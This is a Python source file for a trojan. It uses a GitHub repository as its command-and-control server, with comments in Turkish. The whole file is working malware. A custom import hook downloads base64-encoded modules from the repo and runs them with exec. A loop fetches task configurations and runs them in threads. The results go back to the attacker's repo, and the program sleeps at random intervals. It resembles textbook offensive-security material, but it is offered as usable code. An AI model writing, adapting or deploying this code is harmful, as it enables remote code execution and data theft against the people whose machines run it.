import json
import base64
import sys
import time
import types
import random
import threading
import queue
from github3 import login

trojan_id = "abc"
trojan_config = "config/{}.json".format(trojan_id)
data_path = "data/{}/".format(trojan_id)
trojan_modules = []
configured = False
task_queue = queue.Queue()


class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        if configured:
            print("[*] Attempting to retrieve %s" % fullname)
            new_library = get_file_contents("modules/%s" % fullname)
            if new_library:
                self.current_module_code = base64.b64decode(new_library)
                return self
        return None

    def load_module(self, name):
        module = types.ModuleType(name)
        exec(self.current_module_code, module.__dict__)
        sys.modules[name] = module
        return module


def connect_to_github():
    """
    Hesabınız erişim için 2FA kullanıyorsa (olması gerektiği gibi),
    GitHub tarafından oluşturulan bir access token için
    aşağıdaki login() fonksyonundaki parolayı değiştirebilirsiniz.
    Bu token'ın nasıl oluşturulacağına ilişkin
    anlaması kolay talimatlar burada bulunabilir:
    https://help.github.com/en/github/authenticating-to-github/
    creating-a-personal-access-token-for-the-command-line

    Token'ı kullanmayı seçerseniz, aşağıdaki "token" için "password"
    özelliğini değiştirin ve GitHub tarafından oluşturulan token'ı
    "YourPassword" değerinin yerine yapıştırın. Kod şöyle olmalıdır:
    gh = login(username="YourUsername", token="YourToken")
    """
    gh = login(username="YourUsername", password="YourPassword")
    repo = gh.repository("YourUsername", "RepositoryName")
    branch = repo.branch("master")
    return gh, repo, branch


def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.to_tree().recurse()
    for filename in tree.tree:
        if filepath in filename.path:
            print("[*] Found file %s" % filepath)
            blob = repo.blob(filename._json_data['sha'])
            return blob.content
    return None


def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    configuration = json.loads(base64.b64decode(config_json))
    configured = True

    for tasks in configuration:
        if tasks['module'] not in sys.modules:
            exec("import %s" % tasks['module'])

    return configuration


def store_module_result(data):
    gh, repo, branch = connect_to_github()
    remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000, 100000))
    repo.create_file(remote_path, "Commit message", data.encode())
    return


def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    # sonucu repomuzda saklayın
    store_module_result(result)
    return


# ana trojan döngüsü
sys.meta_path = [GitImporter()]

while True:
    if task_queue.empty():
        config = get_trojan_config()
        for task in config:
            t = threading.Thread(target=module_runner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(1, 10))
    time.sleep(random.randint(1000, 10000))
